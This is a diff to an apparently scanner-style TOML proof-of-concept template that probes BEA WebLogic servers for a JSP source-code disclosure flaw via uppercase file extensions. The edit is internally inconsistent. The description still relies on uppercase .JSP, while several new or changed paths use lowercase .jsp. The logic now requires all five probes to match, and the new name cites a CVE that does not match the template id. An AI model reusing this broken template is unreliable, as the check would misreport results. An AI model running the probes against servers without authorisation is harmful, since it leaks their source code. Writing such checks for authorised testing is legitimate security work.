@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "BEA WebLogic 3.1.8 至 4.5.1 版本存在 JSP 源代码泄露漏洞，请求时将 JSP 文件扩展名改为大写（如 .JSP）即可直接获取源码"
+description = "验证 BEA WebLogic 3.1.8-4.5.1 默认配置下，通过请求大写 .JSP 扩展名绕过 JSP 编译直接获取源代码"
 id = "POC-AVE-2000-0560"
-name = "BEA WebLogic JSP Source Code Disclosure PoC"
+name = "CVE-2000-0499 PoC"
 severity = "high"
 tags = ["ave-2000-0560"]
 vuln_id = [
@@ -11,12 +11,15 @@ vuln_id = [
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/examples/jsp/num/numguess.JSP"
+path = "/{{BaseURL}}/examples/jsp/num/numguess.jsp"
 protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
@@ -24,5 +27,88 @@ part = "body"
 type = "word"
 words = [
     "<%@",
-    "page ",
+    "<%",
+    "import",
+    "java.",
+    "jsp:",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/examples/jsp/snp/snoop.jsp"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<%@",
+    "<%",
+    "import",
+    "java.",
+    "jsp:",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/examples/jsp/dates/date.jsp"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<%@",
+    "<%",
+    "import",
+    "java.",
+    "jsp:",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/index.JSP"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<%@",
+    "<%",
+    "import",
+    "java.",
+    "jsp:",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/default.JSP"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<%@",
+    "<%",
+    "import",
+    "java.",
+    "jsp:",
 ]
